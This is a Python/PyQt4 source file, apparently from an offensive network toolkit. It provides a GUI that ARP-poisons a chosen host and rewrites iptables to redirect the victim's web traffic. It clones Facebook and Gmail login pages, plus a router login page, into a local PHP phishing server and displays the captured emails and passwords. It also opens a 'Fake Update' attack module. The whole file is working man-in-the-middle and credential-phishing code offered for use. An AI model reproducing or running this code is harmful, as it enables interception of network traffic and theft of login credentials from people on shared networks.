from PyQt4.QtGui import *
from PyQt4.QtCore import *
from os import popen,devnull
from Core.Settings_fuc import frm_Settings
from Module.networksdisc import frm_GetIP
from Module.AttackUp_arp import frm_update_attack
from os import popen,chdir,getcwd,getuid
import fcntl, socket, struct
from scapy.all import *
import subprocess
import threading
from time import sleep
from re import compile
from urllib2 import urlopen,URLError
class frm_Arp(QMainWindow):
    def __init__(self, parent=None):
        super(frm_Arp, self).__init__(parent)
        self.form_widget = frm_Arp_Poison(self)
        self.setCentralWidget(self.form_widget)

class frm_Arp_Poison(QWidget):
    def __init__(self, parent=None):
        super(frm_Arp_Poison, self).__init__(parent)
        self.setWindowTitle("Arp Posion Attack ")
        self.setWindowIcon(QIcon('rsc/icon.ico'))
        sshFile="Core/dark_style.css"
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())
        self.Main = QVBoxLayout()
        self.owd = getcwd()
        self.control = False
        self.local = self.get_geteway()
        self.configure = frm_Settings()
        self.module_network = frm_GetIP()
        self.GUI()

    def GUI(self):
        self.form =QFormLayout()
        self.list_ip = QListWidget(self)
        self.list_ip.setFixedHeight(250)
        self.list_ip.clicked.connect(self.list_clicked_scan)
        self.txt_target = QLineEdit(self)
        self.txt_gateway = QLineEdit(self)
        self.txt_redirect = QLineEdit(self)
        self.txt_mac = QLineEdit(self)
        self.ip_range = QLineEdit(self)
        self.txt_status = QLabel("")
        self.txt_statusarp = QLabel("")

        self.scanner_OFF(False,"txt_status")
        self.arp_status(False)
        scan_range = self.configure.xmlSettings("scan","rangeIP",None,False)
        self.ip_range.setText(scan_range)

        self.btn_start_scanner = QPushButton("Scan")
        self.btn_stop_scanner = QPushButton("Stop")
        self.btn_Attack_Posion = QPushButton("Start Attack")
        self.btn_Stop_Posion = QPushButton("Stop Attack")
        self.btn_server = QPushButton("Templates")
        self.btn_capture = QPushButton("Get credentials")
        self.btn_windows_update = QPushButton("Fake Update")
        self.btn_server.setFixedHeight(22)
        self.btn_stop_scanner.setFixedWidth(100)
        self.btn_start_scanner.setFixedWidth(100)
        self.btn_start_scanner.setFixedHeight(22)
        self.btn_stop_scanner.setFixedHeight(22)
        self.btn_windows_update.setFixedHeight(22)

        self.btn_server.setIcon(QIcon("rsc/page.png"))
        self.btn_capture.setIcon(QIcon("rsc/password.png"))

        self.check_face = QCheckBox("Facebook")
        self.check_gmail = QCheckBox("Gmail")
        self.check_route = QCheckBox("Router WPA-2")


        self.check_face.clicked.connect(self.check_options)
        self.check_gmail.clicked.connect(self.check_options)
        self.check_route.clicked.connect(self.check_options)

        self.btn_start_scanner.clicked.connect(self.check_geteway_scan)
        self.btn_stop_scanner.clicked.connect(self.Stop_scan)
        self.btn_Attack_Posion.clicked.connect(self.Start_Attack)
        self.btn_Stop_Posion.clicked.connect(self.kill_attack)
        self.btn_server.clicked.connect(self.show_template_dialog)
        self.btn_capture.clicked.connect(self.show_frm_options)
        self.btn_windows_update.clicked.connect(self.show_frm_fake)

        #icons
        self.btn_start_scanner.setIcon(QIcon("rsc/network.png"))
        self.btn_Attack_Posion.setIcon(QIcon("rsc/start.png"))
        self.btn_Stop_Posion.setIcon(QIcon("rsc/Stop.png"))
        self.btn_stop_scanner.setIcon(QIcon("rsc/network_off.png"))

        self.grid0 = QGridLayout()
        self.grid0.addWidget(QLabel("Scanner:"),0,0)
        self.grid0.addWidget(self.txt_status,0,1)
        self.grid0.addWidget(QLabel("ArpPosion:"),0,2)
        self.grid0.addWidget(self.txt_statusarp,0,3)
        self.grid0.addWidget(self.btn_Attack_Posion,1,0)
        self.grid0.addWidget(self.btn_Stop_Posion,1,3)

        # grid options
        self.grid1 = QGridLayout()
        self.grid1.addWidget(self.btn_start_scanner,0,0)
        self.grid1.addWidget(self.btn_stop_scanner,0,1)
        self.grid1.addWidget(self.btn_capture,0,2)
        self.grid1.addWidget(self.btn_server,0,3)

        self.grid1.addWidget(self.check_face,1,0)
        self.grid1.addWidget(self.check_gmail,1,1)
        self.grid1.addWidget(self.check_route,1,2)
        self.grid1.addWidget(self.btn_windows_update, 1,3)

        if self.local != None:
            self.txt_gateway.setText(self.configure.xmlSettings("local1","gateway",None,False))
            self.txt_redirect.setText(self.configure.xmlSettings("local0","ipaddress",None,False))
            self.configure.xmlSettings("local1","gateway",self.local[0],False)
            self.txt_mac.setText(self.getHwAddr(self.local[1]))
        else:
            self.configure.xmlSettings("local1","gateway","None",False)
            self.configure.xmlSettings("local0","ipaddress","None",False)

        self.form.addRow(self.list_ip)
        self.form.addRow(self.grid1)
        self.form.addRow("Target:", self.txt_target)
        self.form.addRow("GateWay:", self.txt_gateway)
        self.form.addRow("MAC address:", self.txt_mac)
        self.form.addRow("Redirect IP:", self.txt_redirect)
        self.form.addRow("IP ranger Scan:",self.ip_range)
        self.form.addRow(self.grid0)
        self.Main.addLayout(self.form)
        self.setLayout(self.Main)

    def show_frm_options(self):
        option = True
        self.h = frm_get_credentials()
        if self.check_face.isChecked():
            self.h.radio_face.setChecked(True)
        elif self.check_gmail.isChecked():
            self.h.radio_gmail.setChecked(True)
        elif self.check_route.isChecked():
            self.h.radio_route.setChecked(True)
        else:
            option = False
            QMessageBox.information(self, "Error checkbox not checked", "please, select the option correctly.")
        if option:
            self.h.setWindowTitle("Get credentials Templates")
            self.h.show()


    def show_frm_fake(self):
        self.n = frm_update_attack()
        self.n.setGeometry(QRect(100, 100, 450, 300))
        self.n.show()

    def show_template_dialog(self):
        self.j = frm_template()
        self.j.setWindowTitle("Templates Phishing Attack")
        self.j.txt_redirect.setText(self.txt_redirect.text())
        self.j.show()
    def kill_attack(self):
        popen("killall xterm")
        self.arp_status(False)
        self.conf_attack(False)

    @pyqtSlot(QModelIndex)
    def check_options(self,index):
        if self.check_face.isChecked():
            self.check_route.setChecked(False)
            self.check_gmail.setChecked(False)
        elif self.check_gmail.isChecked():
            self.check_face.setChecked(False)
            self.check_route.setChecked(False)
        else:
            self.check_face.setChecked(False)
            self.check_gmail.setChecked(False)

    def Start_Attack(self):
        if  (len(self.txt_target.text()) and len(self.txt_mac.text()) and len(self.txt_gateway.text())) == 0:
            QMessageBox.information(self, 'Error Arp Attacker', "you need set the input correctly")
        else:
            self.thread_arp = threading.Thread(target=self.Attack_Posion,args=(self.txt_target.text(),
            self.txt_gateway.text(),self.txt_mac.text(),))
            self.thread_arp.daemon = True
            self.thread_arp.start()

    def conf_attack(self,bool_conf):
        if bool_conf:
            self.ip = self.configure.xmlSettings("local0","ipaddress",None,False)
            if self.ip !="None":
                iptables = ['iptables -t nat --flush','iptables --zero',
                        'iptables -A FORWARD --in-interface '+self.local[1]+' -j ACCEPT',
                        'iptables -t nat --append POSTROUTING --out-interface '+ self.local[1] +' -j MASQUERADE',
                        'iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination '+self.ip,]
                for i in iptables:
                    popen(i)

        else:
            nano = ["echo \"0\" > /proc/sys/net/ipv4/ip_forward","iptables --flush",  "iptables --table nat --flush" ,\
                "iptables --delete-chain", "iptables --table nat --delete-chain"]
            for delete in nano:
                popen(delete)

    def Attack_Posion(self,target,gateway,mac):
        chdir(self.owd)
        if (len(target) and len(gateway)) and len(mac) != 0:
            if len(self.txt_redirect.text()) != 0:
                self.arp_status(True)
                self.conf_attack(True)
                n = (popen("""xterm -geometry 75x15-1+200 -T "ARP POSION Attack On %s" -e sudo python Module/arp_Attacker.py %s %s %s """%(target,
                target,gateway,mac)).read()) + "exit"
                while n != "dsa":
                    if n == "exit":
                        self.arp_status(False)
                        self.conf_attack(False)
                        break
        else:
            self.arp_status(False)
    def check_geteway_scan(self):
        self.local = self.get_geteway()
        if self.local or self.txt_gateway != "":
            if not self.local:
                self.t = threading.Thread(target=self.scanner_network,args=(str(self.txt_gateway.text()),))
                self.t.daemon = True
                self.t.start()
            else:
                self.t = threading.Thread(target=self.scanner_network,args=(self.local[0],))
                self.t.daemon = True
                self.t.start()
        else:
            QMessageBox.information(self,"Error", "Gateway Not found check the internet connection")

    def Stop_scan(self):
        self.control = False

    def scanner_OFF(self,bool,wid):
        if bool and wid == "txt_status":
            self.txt_status.setText("[ ON ]")
            self.txt_status.setStyleSheet("QLabel {  color : green; }")
        else:
            self.txt_status.setText("[ OFF ]")
            self.txt_status.setStyleSheet("QLabel {  color : red; }")
        popen("clear")

    def arp_status(self,bool):
        if bool:
            self.txt_statusarp.setText("[ ON ]")
            self.txt_statusarp.setStyleSheet("QLabel {  color : green; }")
        else:
            self.txt_statusarp.setText("[ OFF ]")
            self.txt_statusarp.setStyleSheet("QLabel {  color : red; }")
        popen("clear")

    def scanner_network(self,gateway):
        self.list_ip.clear()
        self.control =False
        get_ip = len(gateway)-1
        gateway = gateway[:get_ip]
        ranger = str(self.ip_range.text()).split("-")
        with open(devnull, "wb") as limbo:
            self.control = True
            self.scanner_OFF(True,"txt_status")
            for n in xrange(int(ranger[0]),int(ranger[1])):
                ip="%s{0}".format(n)%(gateway)
                result=subprocess.Popen(["ping", "-c", "1", "-n", "-W", "1", ip],
                                        stdout=limbo, stderr=limbo).wait()
                if not result:
                    itm = QListWidgetItem(ip)
                    itm.setIcon(QIcon(r"rsc/online.png"))
                    self.list_ip.addItem(itm)
                else:
                    print ip, "Offline"
                if not self.control:
                    self.scanner_OFF(False,"txt_status")
                    break
            self.scanner_OFF(False,"txt_status")
            self.control =False

    def get_geteway(self):
        output = popen("route | grep default").read().split()
        if output == []:
            return None
        return [output[1],output[7]]

    def getHwAddr(self,ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
        return ':'.join(['%02x' % ord(char) for char in info[18:24]])

    @pyqtSlot(QModelIndex)
    def list_clicked_scan(self, index):
        itms = self.list_ip.selectedIndexes()
        for i in itms:
            self.txt_target.setText(i.data().toString())
            self.control = False

class frm_template(QDialog):
    def __init__(self, parent = None):
        super(frm_template, self).__init__(parent)
        self.label = QLabel()
        self.Main = QVBoxLayout(self)
        self.setGeometry(0, 0, 254, 100)
        self.center()
        self.control = None
        self.owd = getcwd()
        sshFile="Core/dark_style.css"
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())
        self.gui_temp()
    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())
    def gui_temp(self):
        self.frm0 = QFormLayout(self)
        self.check_face = QCheckBox("Facebook")
        self.check_gmail = QCheckBox("Gmail")
        self.check_route = QCheckBox("Router")

        # connect buton
        self.check_face.clicked.connect(self.check_options)
        self.check_gmail.clicked.connect(self.check_options)
        self.check_route.clicked.connect(self.check_options)

        self.txt_redirect =  QLineEdit(self)
        self.btn_start_template = QPushButton("Start Server HTTP")
        self.btn_start_template.clicked.connect(self.start_server)

        self.frm0.addRow(QLabel("IP Redirect:"),self.txt_redirect)
        self.frm0.addRow(self.check_face)
        self.frm0.addRow(self.check_gmail)
        self.frm0.addRow(self.check_route)
        self.frm0.addRow(self.btn_start_template)

        self.Main.addLayout(self.frm0)
        self.setLayout(self.Main)

    def start_server(self):
        if self.check_face.isChecked():
            url = 'http://facebook.com'
            try:
                sock = urlopen(url).read()
                self.control = 1
            except URLError, e:
                QMessageBox.information(self,"Error","Server not found, can't find the server at focebook. " + str(e))
            if self.control != None:
                if not getuid() == 0:
                    QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                    return None
        elif self.check_gmail.isChecked():
            sock = None
            try:
                request = urlopen('http://accounts.google.com/Login?hl').read()
                self.control = 1
            except URLError,e:
                QMessageBox.information(self,"Error","Server not found, can't find the server at google. " + str(e))
        elif self.check_route.isChecked():
            sock = 1
        else:
            sock = 3
        if self.control != None:
            self.thread_page = threading.Thread(target=self.phishing_page,args=(sock,))
            self.thread_page.daemon = True
            self.thread_page.start()

    def phishing_page(self,sock):
            type_phishing = None
            if sock != None and sock != 1:
                path = "Module/Phishing/Facebook/"
                try:
                    chdir(path)
                except OSError,e:
                    return None
                pat = compile('<DT><a href="[^"]+">(.+?)</a>')
                sock_request = sock.replace("https://www.facebook.com/login.php?login_attempt=1", "login.php")
                face_page= open("index.html", "w")
                face_page.write(sock_request)
                face_page.close()
                type_phishing = "Facebook"
            elif sock == 1 and sock != None:
                path = "Module/Phishing/Route/"
                chdir(path)
                type_phishing = "Route"
            else:
                path = "Module/Phishing/Gmail/"
                try:
                    chdir(path)
                    request = urlopen('http://accounts.google.com/Login?hl').read()
                    request = request.replace("//ssl.gstatic.com/accounts/ui/","")
                    request = request.replace("https://accounts.google.com/ServiceLoginAuth","login.php")
                    google_page = open("index.html", "w")
                    google_page.write(request)
                    google_page.close()
                except OSError,e:
                    return None
                type_phishing = "Gmail"

            ip = str(self.txt_redirect.text())
            popen("service apache2 stop")
            if ip == None:
                pass
                sleep(5)
            else:
                n = (popen("""xterm -geometry 75x15-1+0 -T "Phishing %s" -e php -S %s:80"""%(type_phishing,ip))).read() + "exit"
                chdir(self.owd)
                while n != "dsa":
                    if n == "exit":
                        break
    @pyqtSlot(QModelIndex)
    def check_options(self,index):
        if self.check_face.isChecked():
            self.check_route.setChecked(False)
            self.check_gmail.setChecked(False)
        elif self.check_gmail.isChecked():
            self.check_face.setChecked(False)
            self.check_route.setChecked(False)
        else:
            self.check_face.setChecked(False)
            self.check_gmail.setChecked(False)

class frm_get_credentials(QDialog):
    def __init__(self, parent = None):
        super(frm_get_credentials, self).__init__(parent)
        self.label = QLabel()
        self.Main = QVBoxLayout(self)
        self.setGeometry(0, 0, 450, 200)
        self.center()
        self.owd = getcwd()
        sshFile="Core/dark_style.css"
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())
        self.Qui()
    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def get_password(self):
        if self.radio_face.isChecked():
            self.list_password.clear()
            logins = []
            chdir(self.owd)
            log = open("Module/Phishing/Facebook/log.txt", "r")
            for i,j in enumerate(log.readlines()):
                logins.append(i)
                s = j.split("-")
                self.list_password.addItem("Email: " +s[0] + "   Password: " +s[1])
        elif self.radio_gmail.isChecked():
            self.list_password.clear()
            logins = []
            chdir(self.owd)
            log = open("Module/Phishing/Gmail/log.txt", "r")
            for i,j in enumerate(log.readlines()):
                logins.append(i)
                s = j.split("-")
                self.list_password.addItem("Email: " +s[0] + "   Password: " +s[1])
        elif self.radio_route.isChecked():
            self.list_password.clear()
            logins = []
            chdir(self.owd)
            log = open("Module/Phishing/Route/log.txt", "r")
            for i,j in enumerate(log.readlines()):
                logins.append(i)
                s = j.split("-")
                self.list_password.addItem("IP: " +s[0] + "   Password: " +s[1])
    def Qui(self):
        self.frm0 = QFormLayout(self)
        self.list_password = QListWidget(self)
        self.list_password.setFixedHeight(200)

        self.btn_getdata = QPushButton("get data")
        self.btn_getdata.clicked.connect(self.get_password)
        self.btn_exit = QPushButton("Exit")
        self.btn_exit.clicked.connect(self.deleteLater)

        self.radio_face  = QRadioButton("Facebook")
        self.radio_gmail = QRadioButton("Gmail")
        self.radio_route = QRadioButton("Router")
        self.grid_radio = QGridLayout(self)
        self.grid_radio.addWidget(self.radio_face,0,0)
        self.grid_radio.addWidget(self.radio_gmail,0,1)
        self.grid_radio.addWidget(self.radio_route,0,2)
        self.frm0.addRow(self.list_password)
        self.frm0.addRow(self.grid_radio)
        self.frm0.addRow(self.btn_getdata)
        self.frm0.addRow(self.btn_exit)
        self.Main.addLayout(self.frm0)
        self.setLayout(self.Main)